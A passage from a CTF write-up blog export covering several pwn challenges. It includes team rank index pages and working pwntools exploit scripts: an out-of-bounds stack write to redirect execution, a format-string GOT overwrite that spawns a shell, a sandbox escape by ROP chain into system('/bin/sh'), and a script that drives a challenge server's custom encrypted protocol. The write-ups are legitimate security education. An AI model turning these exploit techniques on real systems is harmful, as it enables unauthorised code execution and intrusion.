<p><a href="./uploads/uwu-intewpwetew.c">uwu-intewpwetew.c</a></p>
<p>all the mitigation protection has open as expected</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Arch:     amd64-64-little</span><br><span class="line"># RELRO:    Full RELRO</span><br><span class="line"># Stack:    Canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<p>lets take look at some bugs, firstly, it check the upper bound, but not lower bound. We can see here the pointer is never gonna large than <code>DATA_LEN</code> if it is negative. </p>
<p>This allow us to read the value above the stack variable</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">case &#x27;o&#x27;:</span><br><span class="line">    pointer--;</span><br><span class="line">    if (pointer &gt; DATA_LEN) &#123;</span><br><span class="line">        printf(&quot;Error: out of bounds\n&quot;);</span><br><span class="line">        print_remaining_and_exit(input, i);</span><br><span class="line">    &#125;</span><br><span class="line">break;</span><br></pre></td></tr></table></figure>

<p>The second bug is it didn&#39;t check for out of bound when read and write value.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">case &#x27;@&#x27;:</span><br><span class="line">    printf(&quot;\npointer: %d\ndata: %d\n&quot;, pointer, data[pointer]);</span><br><span class="line">    break;</span><br><span class="line">case &#x27;&gt;&#x27;:</span><br><span class="line">    printf(&quot;\nInput: &quot;);</span><br><span class="line">    scanf(&quot; %d&quot;, &amp;data[pointer]);</span><br><span class="line">    break;</span><br></pre></td></tr></table></figure>

<p>So, lets combine those two bug. first, lets move the variable pointer to pointer&#39;s address (where pointer is on the stack) . </p>
<p>Then, use write pointer&#39;s value to RIP offset,</p>
<p>finally. read RIP address and write RIP address to function win. After execution finish, the binary will jump to <code>win</code> and print out the flag</p>
<p>part of my exploit.py</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class uwu():</span><br><span class="line">    right = &quot;OwO&quot;</span><br><span class="line">    left = &quot;owo&quot;</span><br><span class="line">    read = &quot;@w@&quot;</span><br><span class="line">    write = &quot;&gt;w&lt;&quot;</span><br><span class="line">    plus = &quot;UwU&quot;</span><br><span class="line">    minus = &quot;QwQ&quot;</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.instructions = []</span><br><span class="line"></span><br><span class="line">    def add(self,*args):</span><br><span class="line">        self.instructions.extend(args)</span><br><span class="line">    </span><br><span class="line">    def add_list(self,args):</span><br><span class="line">        self.instructions.extend(args)</span><br><span class="line">    </span><br><span class="line">    def output(self):</span><br><span class="line">        return &quot; &quot;.join(self.instructions)</span><br><span class="line"></span><br><span class="line">main_addr = exe.sym[&quot;main&quot;]</span><br><span class="line">log_print(&quot;main addr&quot;, hex(main_addr))</span><br><span class="line">vuln_addr = exe.sym[&quot;vuln&quot;]</span><br><span class="line">log_print(&quot;vuln addr&quot;, hex(vuln_addr))</span><br><span class="line">win_addr = exe.sym[&quot;win&quot;]</span><br><span class="line">log_print(&quot;win addr&quot;, hex(win_addr))</span><br><span class="line"></span><br><span class="line">log_print(hex(vuln_addr-win_addr))</span><br><span class="line"># payload = uwu()</span><br><span class="line"># payload.add(uwu.right,uwu.plus,uwu.right,uwu.plus,uwu.right,uwu.plus,)</span><br><span class="line"># print(payload.output())</span><br><span class="line"></span><br><span class="line">payload = uwu()</span><br><span class="line"># 4 byte padding</span><br><span class="line">payload.add_list([uwu.left]*((0x424-0x410)//4 -1))</span><br><span class="line">payload.add(uwu.read)</span><br><span class="line">payload.add(uwu.write)</span><br><span class="line">log_print(&quot;rip padd offset&quot;, (0x410+0x8)//4)</span><br><span class="line">payload.add(uwu.read)</span><br><span class="line">payload.add(uwu.write)</span><br><span class="line">log_print(payload.output())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line">io.sendlineafter(b&quot;Send me your cowode:\n&quot;,payload.output().encode())</span><br><span class="line">io.sendlineafter(b&quot;Input: &quot;,str((0x410+0x8)//4).encode())</span><br><span class="line">io.recvuntil(b&quot;data: &quot;)</span><br><span class="line">main_rip_address = int(io.recvuntil(b&quot;\n&quot;)[:-1:])</span><br><span class="line">log_print(&quot;main rip address&quot;,main_rip_address,hex(main_rip_address &amp; 0xffffffff))</span><br><span class="line">win_real_addr = (main_rip_address &amp; 0xfffff000) | (win_addr &amp; 0xfff)</span><br><span class="line">log_print(&quot;win_real_addr&quot;,win_real_addr,hex(win_real_addr))</span><br><span class="line">io.sendlineafter(b&quot;Input: &quot;,str(win_real_addr).encode())</span><br><span class="line"></span><br><span class="line">log_print(&quot;flag&quot;,io.recv())</span><br></pre></td></tr></table></figure>

<p><strong>flag</strong>: maple{nyo_wespect_fow_boundawies}</p>
]]></content>
  </entry>
  <entry>
    <title>San Diego CTF 2022</title>
    <url>/ctf-writeup/2022/sdctf/index.html</url>
    <content><![CDATA[<h1 id="San-Diego-CTF-2022"><a href="#San-Diego-CTF-2022" class="headerlink" title="San Diego CTF 2022"></a>San Diego CTF 2022</h1><p><a href="https://sdc.tf/">https://sdc.tf/</a></p>
<p>Official Repo: <a href="https://github.com/acmucsd/sdctf-2022">https://github.com/acmucsd/sdctf-2022</a></p>
<h1 id="Rank"><a href="#Rank" class="headerlink" title="Rank"></a>Rank</h1><p>3rd place (<a href="https://ctftime.org/team/73723">MapleBacon</a>)</p>
<h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1><ul>
<li><a href="./pwn/oil-spill">[pwn] Oil Spill</a></li>
<li><a href="./pwn/horoscope">[pwn] horoscope</a></li>
<li><a href="./pwn/breakfast-menu">[pwn] breakfast-menu</a></li>
<li><a href="./pwn/secure-horoscope">[pwn] secure-horoscope</a></li>
<li><a href="./pwn/shamav">[pwn] shamav</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>Sekai CTF 2022</title>
    <url>/ctf-writeup/2022/sekaictf/index.html</url>
    <content><![CDATA[<h1 id="Tamu-CTF-2022"><a href="#Tamu-CTF-2022" class="headerlink" title="Tamu CTF 2022"></a>Tamu CTF 2022</h1><p><a href="https://ctf.sekai.team/">https://ctf.sekai.team/</a></p>
<h1 id="Rank"><a href="#Rank" class="headerlink" title="Rank"></a>Rank</h1><p>8 place (<a href="https://ctftime.org/team/73723">MapleBacon</a>)</p>
<h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1><ul>
<li><a href="./pwn/saveme">[pwn] saveme</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>Tamu CTF 2022</title>
    <url>/ctf-writeup/2022/tamuctf/index.html</url>
    <content><![CDATA[<h1 id="Tamu-CTF-2022"><a href="#Tamu-CTF-2022" class="headerlink" title="Tamu CTF 2022"></a>Tamu CTF 2022</h1><p><a href="https://tamuctf.com/">https://tamuctf.com/</a></p>
<h1 id="Rank"><a href="#Rank" class="headerlink" title="Rank"></a>Rank</h1><p>1 place (<a href="https://ctftime.org/team/73723">MapleBacon</a>)</p>
<h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1><ul>
<li><a href="./pwn/trivial">[pwn] trivial</a></li>
<li><a href="./pwn/lucky">[pwn] lucky</a></li>
<li><a href="./pwn/ctf_sim">[pwn] ctf_sim</a></li>
<li><a href="./pwn/void">[pwn] void</a></li>
<li><a href="./pwn/rop_golf">[pwn] rop_golf</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>UT CTF 2022</title>
    <url>/ctf-writeup/2022/utctf/index.html</url>
    <content><![CDATA[<h1 id="UT-CTF-2022"><a href="#UT-CTF-2022" class="headerlink" title="UT CTF 2022"></a>UT CTF 2022</h1><h1 id="Rank"><a href="#Rank" class="headerlink" title="Rank"></a>Rank</h1><h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1><ul>
<li><a href="./utctf2022-malformed-query-network">[Network] malformed query</a></li>
<li><a href="./utctf2022-pwn-smol">[Pwn] smol</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>Malformed Query - How to analyze a transmission protocol [utctf 2022]</title>
    <url>/ctf-writeup/2022/utctf/utctf2022-malformed-query-network.html</url>
    <content><![CDATA[<h1 id="0x0-Description"><a href="#0x0-Description" class="headerlink" title="0x0 Description"></a>0x0 Description</h1><p>The problem give us a wireshark data packets files. Our goal is to analyze the packet, find the protocol used in the interaction and get the flag.</p>
<h1 id="0x1-Analyze-the-protocol"><a href="#0x1-Analyze-the-protocol" class="headerlink" title="0x1 Analyze the protocol"></a>0x1 Analyze the protocol</h1><p>in the wireshark, there is a very suspicious udp stream (3.93.213.98:9855) that gives us a command result of <code>ls -al</code>.</p>
<p>the connection start with a packet that contains <code>publickey</code>. </p>
<span id="more"></span>

<p>Then server reply with a packet with a RSA publickey.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000  00 0c 01 00 00 01 00 00  00 00 00 00 09 70 75 62   ........ .....pub</span><br><span class="line">00000010  6c 69 63 6b 65 79 00 00  10 00 01                  lickey.. ...</span><br></pre></td></tr></table></figure>

<p>If we copy the first packet and send to the sever, we got a new response with a different publickey! </p>
<p>This clearly shows that the server is using a special protocol to interact with client. </p>
<p>Now, our goal is to figure out how is the protocol looks like.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = connect(&quot;3.93.213.98&quot;,9855,typ=&quot;udp&quot;)</span><br><span class="line">io.send(bytes.fromhex(&quot;000c01000001000000000000097075626c69636b65790000100001&quot;))</span><br><span class="line">print(io.recv())</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ python xxx.py </span><br><span class="line">[+] Opening connection to 3.93.213.98 on port 9855: Done</span><br><span class="line">b&#x27;\x00\x0c\x81\x80\x00\x01\x00\x02\x00\x00\x00\x00\tpublickey\x00\x00\x10\x00\x01\xc0\x0c\x00\x10\x00\x01\x00\x00\x137\x00\xff\xfe-----BEGIN RSA PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyljjH5MViK9eDX3TYlO8\nCei+rVufA+lrsw36gv/Ntv34PBXebZBC8BSwy/t0jMHnn7+9fY0zum9sMwV7A7R9\n3RWt5WppeqPyhuFNlM8DoGN5RLjTVLLKvSG2df5c8IktfDpjdrgUYDOiMMN7ANVE\nyIK+Nt+RBoGK2fkKk3NljlmmXKKP\xc0\x0c\x00\x10\x00\x01\x00\x00\x137\x00\xce\xcdU2yQZX6uHgMPXk1QSvXRsPcdWG255dBhVXK/\nrB2vAMOsD2QDMiUEa5KFgDxoBT3CH1H2nPCcXGux2j+gCpxyzzSdWrdxw64xmcGm\nrYWyC/lEygNDYc82JQJatHJSeDmz1TeA6LoY29QnKzSfrOZNvRxaB9NbbY7s9zRS\nJwIDAQAB\n-----END RSA PUBLIC KEY-----\n&#x27;</span><br></pre></td></tr></table></figure>

<p>Further analyze the packet, we found all the packet follows a similar structure.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">header  + sequence num + next sequence num + magic data + [length +  data  + ending] * n</span><br><span class="line">4 bytes +    2 bytes   +     2 bytes       +   4 bytes  + [1 byte + n byte + 5 byte] * n</span><br></pre></td></tr></table></figure>

<p>Note that the max length for a single message is <code>0xfe(254)</code>, if our data is more than 254 bytes, we need seperate data into 254 bytes chunks.</p>
<p>Here is the packet (9 bytes) client send to the server</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000  00 0c 01 00 00 01 00 00  00 00 00 00 09     70 75 62   ........ .....pub</span><br><span class="line">          header      seq n seq    magic data  length data</span><br><span class="line">00000010  6c 69 63 6b 65 79 00 00  10 00 01                  lickey.. ...</span><br><span class="line">                            ending bytes</span><br></pre></td></tr></table></figure>

<p>here is another example packet (more than 254 bytes) received from the server</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    00000000  00 0c 81 80 00 01 00 02    00 00 00 00 09  70 75 62   ........ .....pub</span><br><span class="line">              header      seq   next seq magic data  len data</span><br><span class="line">    00000010  6c 69 63 6b 65 79 00 00  10 00 01 c0 0c 00 10 00   lickey.. ........</span><br><span class="line">                                ending bytes    header      seq</span><br><span class="line">    00000020  01 00 00    13 37 00 ff   fe  2d 2d 2d 2d 2d 42 45 47   ....7... -----BEG</span><br><span class="line">                 next seq magic data    len data</span><br><span class="line">    00000030  49 4e 20 52 53 41 20 50  55 42 4c 49 43 20 4b 45   IN RSA P UBLIC KE</span><br><span class="line">    00000040  59 2d 2d 2d 2d 2d 0a 4d  49 49 42 49 6a 41 4e 42   Y-----.M IIBIjANB</span><br><span class="line">......</span><br><span class="line">    00000120  58 39 43 30 6c 33 c0 0c  00 10 00 01 00 00 13 37   X9C0l3.. .......7</span><br><span class="line">                                ending bytes</span><br><span class="line">    00000130  00 ce cd 31 58 72 62 36  75 33 70 74 5a 78 4f 49   ...1Xrb6 u3ptZxOI</span><br><span class="line">......</span><br><span class="line">    000001E0  41 42 0a 2d 2d 2d 2d 2d  45 4e 44 20 52 53 41 20   AB.----- END RSA </span><br><span class="line">    000001F0  50 55 42 4c 49 43 20 4b  45 59 2d 2d 2d 2d 2d 0a   PUBLIC K EY-----.</span><br></pre></td></tr></table></figure>

<p>After we receive the public key, we can encrypt command with public key, send packet to the server and get the flag.</p>
<p>(The encryption using OAEP scheme with sha512)</p>
<h1 id="0x2-Final-script"><a href="#0x2-Final-script" class="headerlink" title="0x2 Final script"></a>0x2 Final script</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from Crypto.PublicKey import RSA</span><br><span class="line">from Crypto.Cipher import PKCS1_v1_5</span><br><span class="line">from Crypto.Cipher import PKCS1_OAEP</span><br><span class="line">from Crypto.Hash import SHA512</span><br><span class="line">import base64</span><br><span class="line">io = connect(&quot;3.93.213.98&quot;,9855,typ=&quot;udp&quot;)</span><br><span class="line">io.send(bytes.fromhex(&quot;000c01000001000000000000097075626c69636b65790000100001&quot;))</span><br><span class="line">print(io.recvuntil(b&quot;-----BEGIN RSA PUBLIC KEY-----\n&quot;).hex())</span><br><span class="line">public_key = io.recvuntil(b&quot;\n-----END RSA PUBLIC KEY-----\n&quot;,drop=True).replace(b&quot;\xc0\x0c\x00\x10\x00\x01\x00\x00\x137\x00\xce\xcd&quot;,b&quot;&quot;)</span><br><span class="line">public_key = b&quot;-----BEGIN RSA PUBLIC KEY-----\n&quot;+public_key+b&quot;\n-----END RSA PUBLIC KEY-----&quot;</span><br><span class="line">print(public_key.decode())</span><br><span class="line">keyPub = RSA.importKey(public_key)</span><br><span class="line">cipher = PKCS1_OAEP.new(keyPub,SHA512)</span><br><span class="line">cipher_text = cipher.encrypt(b&quot;ls&quot;)</span><br><span class="line">print(len(cipher_text),cipher_text.hex())</span><br><span class="line">payload = bytes.fromhex(&quot;000c01000002000000000000&quot;)+bytes.fromhex(&quot;fe&quot;)+cipher_text[:254:]+bytes.fromhex(&quot;0000100001&quot;)+bytes.fromhex(&quot;02&quot;)+cipher_text[254:256:]+bytes.fromhex(&quot;0000100001&quot;)</span><br><span class="line">print(payload.hex())</span><br><span class="line">io.send(payload)</span><br><span class="line">print(io.recv())</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>[pwn] smol [utctf 2022]</title>
    <url>/ctf-writeup/2022/utctf/utctf2022-pwn-smol.html</url>
    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>In this challenge, a binary <code>smol</code> is provided. </p>
<h1 id="0x1-Mitigation"><a href="#0x1-Mitigation" class="headerlink" title="0x1 Mitigation"></a>0x1 Mitigation</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Arch:     amd64-64-little</span><br><span class="line"># RELRO:    Partial RELRO</span><br><span class="line"># Stack:    Canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h1 id="0x2-Identify-the-problem"><a href="#0x2-Identify-the-problem" class="headerlink" title="0x2 Identify the problem"></a>0x2 Identify the problem</h1><p>here is a simplified version of what is main function doing. </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">main(void)</span><br><span class="line">&#123;</span><br><span class="line">    var char *s1 @ rbp-0x150</span><br><span class="line">    var char *format @ rbp-0xe0</span><br><span class="line">    var char *s @ rbp-0x70</span><br><span class="line">    var int64_t canary @ rbp-0x8</span><br><span class="line"></span><br><span class="line">    canary = *(in_FS_OFFSET + 0x28);</span><br><span class="line">    sym.imp.puts(&quot;What kind of data do you have?&quot;);</span><br><span class="line">    sym.imp.gets(&amp;s1);</span><br><span class="line">    iVar2 = sym.imp.strcmp(&amp;s1, &quot;big data&quot;);</span><br><span class="line">    if (iVar2 == 0) &#123;</span><br><span class="line">        // set variable format to some certain format</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // set format to some certain format</span><br><span class="line">    &#125;</span><br><span class="line">    sym.imp.puts(&quot;Give me your data&quot;);</span><br><span class="line">    sym.imp.gets(&amp;s);</span><br><span class="line">    sym.imp.printf(&amp;format, &amp;s);</span><br><span class="line">    sym.imp.putchar(10);</span><br><span class="line">    if (canary != *(in_FS_OFFSET + 0x28)) &#123;</span><br><span class="line">        sym.imp.__stack_chk_fail();</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Take a brief looking at the code, we can identify two trivial vulnerability here. One is <code>gets</code>, which allow us to write arbitrary number of bytes to the stack. Another is <code>printf</code>, printf allow us to read&#x2F;write data at specific address.</p>
<p>Since <code>format</code> is locate under variable <code>s1</code>, we can overwrite <code>format</code> with any format we want using <code>gets(&amp;s1)</code>. This allow us to do a arbitrary read&#x2F;write with <code>printf</code>. </p>
<p>My first idea is try to leak the data in the canary and then do a rop chain to get a shell. However, <code>printf</code> execute after last <code>gets</code> function. Even we get the canary, we can&#39;t overwrite canary because there is no stack overflow bug after that.</p>
<p>Lets take look at mitigation again, the mitigation shows that this program is partial RELRO. This allows us to modify the function address in the global offset table. So it is a good idea using <code>printf</code> to overwrite <code>__stack_chk_fail</code>&#39;s address to a code address in global offset table. Then, we overwrite canary to trigger <code>__stack_chk_fail</code> and call the code we want.</p>
<p>Luckily, the binary kindly give us a backdoor at <code>get_flag()</code>. So, write address of <code>__stack_chk_fail</code> at GOT to <code>get_flag()</code> will give us a shell.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void sym.get_flag(void)&#123;</span><br><span class="line">// some code</span><br><span class="line">    sym.imp.execve(&quot;/bin/sh&quot;, &amp;var_20h, 0);</span><br><span class="line">// some code</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="0x3-Exploits"><a href="#0x3-Exploits" class="headerlink" title="0x3 Exploits"></a>0x3 Exploits</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">io = connect(&quot;pwn.utctf.live&quot;, 5004)</span><br><span class="line"></span><br><span class="line">print(&quot;got __stack_chk_fail,&quot;,hex(exe.got[&quot;__stack_chk_fail&quot;]))</span><br><span class="line">payload1 = flat(&#123;</span><br><span class="line">    0x0:exe.got[&quot;__stack_chk_fail&quot;],</span><br><span class="line">    0x150 - 0xe0: b&#x27;%%%dx%%6$hn\x00&#x27; % 0x1349</span><br><span class="line">&#125;,filler=b&quot;A&quot;)</span><br><span class="line">io.sendlineafter(b&quot;do you have?\n&quot;,payload1)</span><br><span class="line"># trigger stack chk fail</span><br><span class="line">io.sendlineafter(b&quot;Give me your data\n&quot;,b&quot;A&quot;*0x70)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>Bo1lersCTF 2023</title>
    <url>/ctf-writeup/2023/bo1lersctf/index.html</url>
    <content><![CDATA[<h1 id="Bo1lersCTF-2023"><a href="#Bo1lersCTF-2023" class="headerlink" title="Bo1lersCTF 2023"></a>Bo1lersCTF 2023</h1><p><a href="https://ctftime.org/event/1875">https://ctftime.org/event/1875</a></p>
<p><a href="https://github.com/b01lers/b01lers-ctf-2023-public">https://github.com/b01lers/b01lers-ctf-2023-public</a></p>
<h1 id="Rank"><a href="#Rank" class="headerlink" title="Rank"></a>Rank</h1><p>1 th place (<a href="https://ctftime.org/team/73723">MapleBacon</a>)</p>
<h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1><ul>
<li><a href="./pwn/cfifufuuufuuuuu">[pwn] cfifufuuufuuuuu</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>Kalmar CTF 2023</title>
    <url>/ctf-writeup/2023/kalmar/index.html</url>
    <content><![CDATA[<h1 id="Kalmar-CTF-2023"><a href="#Kalmar-CTF-2023" class="headerlink" title="Kalmar CTF 2023"></a>Kalmar CTF 2023</h1><p><a href="https://ctftime.org/event/1878/">https://ctftime.org/event/1878/</a></p>
<h1 id="Rank"><a href="#Rank" class="headerlink" title="Rank"></a>Rank</h1><p>16th place (<a href="https://ctftime.org/team/73723">MapleBacon</a>)</p>
<h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1><ul>
<li><a href="./pwn/js-in-my-bs">[pwn] js-in-my-bs</a></li>
<li><a href="./pwn/mjs">[pwn] mjs</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>LACTF 2023</title>
    <url>/ctf-writeup/2023/lactf/index.html</url>
    <content><![CDATA[<h1 id="LA-CTF-2023"><a href="#LA-CTF-2023" class="headerlink" title="LA CTF 2023"></a>LA CTF 2023</h1><p><a href="https://platform.lac.tf/">https://platform.lac.tf/</a></p>
<h1 id="Rank"><a href="#Rank" class="headerlink" title="Rank"></a>Rank</h1><p>7 th place (<a href="https://ctftime.org/team/73723">MapleBacon</a>)</p>
<h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1><ul>
<li>[[pwn] bot]</li>
<li>[[pwn] rickroll]</li>
<li>[[pwn] rut-roh-relro]</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>MagpieCTF 2023</title>
    <url>/ctf-writeup/2023/magpiectf/index.html</url>
    <content><![CDATA[<h1 id="MagpieCTF-2023"><a href="#MagpieCTF-2023" class="headerlink" title="MagpieCTF 2023"></a>MagpieCTF 2023</h1><p><a href="https://github.com/infosec-ucalgary/magpieCTF-2023">https://github.com/infosec-ucalgary/magpieCTF-2023</a></p>
<h1 id="Rank"><a href="#Rank" class="headerlink" title="Rank"></a>Rank</h1><p>5 th place (<a href="https://ctftime.org/team/73723">MapleBacon</a>)</p>
<h1 id="Notes"><a href="#Notes" class="headerlink" title="Notes"></a>Notes</h1><p>this ctf is literally a guessing game.</p>
<h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1><ul>
<li><a href="./writeup">writeup</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>PicoCTF 2023</title>
    <url>/ctf-writeup/2023/picoctf/index.html</url>
    <content><![CDATA[<h1 id="PicoCTF-2023"><a href="#PicoCTF-2023" class="headerlink" title="PicoCTF 2023"></a>PicoCTF 2023</h1><p><a href="https://play.picoctf.org/">https://play.picoctf.org/</a></p>
<p><strong>pwn full clear</strong></p>
<h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1><ul>
<li>todo</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>[Misc] C-Sandbox</title>
    <url>/ctf-writeup/2022/cakectf/c-sandbox/index.html</url>
    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>I designed a restricted C compiler! nc misc.2022.cakectf.com 10099</p>
<p>files: <a href="c_sandbox_c85cfad2fce8c0c6ac1dc144a1e4229c.tar.gz">c_sandbox_c85cfad2fce8c0c6ac1dc144a1e4229c.tar.gz</a></p>
<h1 id="0x1-Walk-through"><a href="#0x1-Walk-through" class="headerlink" title="0x1 Walk through"></a>0x1 Walk through</h1><p>Basically, the server will compile a C program and execute it. But it only allows 4 function to be called.</p>
<p><code>sandbox.cpp</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Allow these function calls */</span></span><br><span class="line">        <span class="keyword">if</span> (func &amp;&amp; </span><br><span class="line">            (func-&gt;<span class="built_in">getName</span>() == <span class="string">&quot;puts&quot;</span></span><br><span class="line">             || func-&gt;<span class="built_in">getName</span>() == <span class="string">&quot;printf&quot;</span></span><br><span class="line">             || func-&gt;<span class="built_in">getName</span>() == <span class="string">&quot;__isoc99_scanf&quot;</span></span><br><span class="line">             || func-&gt;<span class="built_in">getName</span>() == <span class="string">&quot;exit&quot;</span>))</span><br><span class="line">          <span class="keyword">continue</span>;</span><br></pre></td></tr></table></figure>

<p>Our goal is to get shell with this restriction. </p>
<p>My first approach is using <code>asm</code> in C code. However, the sandbox also detect it and prevent me from executing asm codes.</p>
<p>Then, I tried my second solution. constructing a rop chain. </p>
<p>Since we can use printf&#x2F;puts in our code. We can simply print out the whole stack and find the libc address. Moreoever, The challenge also provide us a Dockerfile, so we can easily extract libc from it and get the libc functions offsets.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">&quot;1.%1$p\n2.%2$p\n3.%3$p\n4.%4$p\n5.%5$p\n6.%6$p\n7.%7$p\n8.%8$p\n&quot;</span></span><br><span class="line">        <span class="string">&quot;9.%9$p\n10.%10$p\n11.%11$p\n12.%12$p\n13.%13$p\n14.%14$p\n15.%15$p\n16.%16$p\n&quot;</span></span><br><span class="line">        );</span><br></pre></td></tr></table></figure>

<p>Modify the stack in C is very straighforward, just create a long array and modify the stack value using index.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> x[<span class="number">1</span>];</span><br><span class="line">x[<span class="number">10</span>] = <span class="number">0x1</span> ; <span class="comment">// modify the stack</span></span><br></pre></td></tr></table></figure>

<h1 id="0x2-Solution"><a href="#0x2-Solution" class="headerlink" title="0x2 Solution"></a>0x2 Solution</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> __libc_start_main_ret = <span class="number">0x24083</span>;</span><br><span class="line"><span class="type">long</span> system_o = <span class="number">0x52290</span>;</span><br><span class="line"><span class="type">long</span> str_bin_sh = <span class="number">0x1b45bd</span>;</span><br><span class="line"><span class="type">long</span> pop_rdi_ret = <span class="number">0x23b6a</span>;</span><br><span class="line"><span class="type">long</span> ret_o = <span class="number">0x22679</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> x[<span class="number">1</span>];</span><br><span class="line">    x[<span class="number">0</span>] = <span class="number">0xffffffffffffffff</span>;</span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">&quot;1.%1$p\n2.%2$p\n3.%3$p\n4.%4$p\n5.%5$p\n6.%6$p\n7.%7$p\n8.%8$p\n&quot;</span></span><br><span class="line">        <span class="string">&quot;9.%9$p\n10.%10$p\n11.%11$p\n12.%12$p\n13.%13$p\n14.%14$p\n15.%15$p\n16.%16$p\n&quot;</span></span><br><span class="line">        );</span><br><span class="line">    </span><br><span class="line">    x[<span class="number">0</span>] = x[<span class="number">2</span>]-__libc_start_main_ret;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,x[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,(<span class="type">char</span> *)(x[<span class="number">0</span>]+str_bin_sh));</span><br><span class="line">    x[<span class="number">2</span>] = x[<span class="number">0</span>] + ret_o;</span><br><span class="line">    x[<span class="number">3</span>] = x[<span class="number">0</span>] + pop_rdi_ret;</span><br><span class="line">    x[<span class="number">4</span>] = x[<span class="number">0</span>] + str_bin_sh;</span><br><span class="line">    x[<span class="number">5</span>] = x[<span class="number">0</span>] + system_o;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="0x3-Flag-Thoughts"><a href="#0x3-Flag-Thoughts" class="headerlink" title="0x3 Flag &amp; Thoughts"></a>0x3 Flag &amp; Thoughts</h1><p>It is actually more like a pwn problem.</p>
<p><code>CakeCTF&#123;briI1ng_yoO0ur_oO0wn_gaA4dgeE3t!&#125;</code></p>
]]></content>
  </entry>
  <entry>
    <title>[Pwn] str.vs.cstr</title>
    <url>/ctf-writeup/2022/cakectf/str_vs_cstr/index.html</url>
    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>Which do you like, C string or C++ string?</p>
<p>nc pwn1.2022.cakectf.com 9003</p>
<p>Files: <a href="str_vs_cstr_f088c31cd2d3c18483e24f38df724cad.tar.gz">str_vs_cstr_f088c31cd2d3c18483e24f38df724cad.tar.gz</a></p>
<h1 id="0x1-Mitigation"><a href="#0x1-Mitigation" class="headerlink" title="0x1 Mitigation"></a>0x1 Mitigation</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

